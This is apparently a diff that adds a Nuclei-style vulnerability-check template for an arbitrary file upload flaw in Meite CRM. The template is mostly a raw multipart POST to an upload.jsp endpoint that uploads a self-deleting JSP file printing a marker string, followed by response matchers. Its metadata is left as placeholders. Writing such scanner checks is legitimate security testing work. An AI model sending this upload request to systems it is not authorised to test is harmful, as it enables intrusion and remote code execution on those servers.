@@ -1,0 +1,56 @@
+id: CRM
+info:
+  name: Template Name
+  author: DELL
+  severity: info
+  description: 美特CRM upload 任意文件上传漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null& HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 777
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgWszxRFokh
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Referer: http://x.x.x.x/develop/systparam/softlogo/file2.jsp
+        Connection: close
+
+        ------WebKitFormBoundary0Mh3BfgWszxRFokh
+        Content-Disposition: form-data; name="file"; filename="klms.jsp"
+        Content-Type: text/plain
+
+        <% out.print("HelloWorldTest");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundary0Mh3BfgWszxRFokh
+        Content-Disposition: form-data; name="key"
+
+        null
+        ------WebKitFormBoundary0Mh3BfgWszxRFokh
+        Content-Disposition: form-data; name="form"
+
+        null
+        ------WebKitFormBoundary0Mh3BfgWszxRFokh
+        Content-Disposition: form-data; name="field"
+
+        null
+        ------WebKitFormBoundary0Mh3BfgWszxRFokh
+        Content-Disposition: form-data; name="filetitile"
+
+        null
+        ------WebKitFormBoundary0Mh3BfgWszxRFokh
+        Content-Disposition: form-data; name="filefolder"
+
+        null
+        ------WebKitFormBoundary0Mh3BfgWszxRFokh--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - /userfile/default/userlogo
+      - type: word
+        part: header
+        words:
+          - '200'
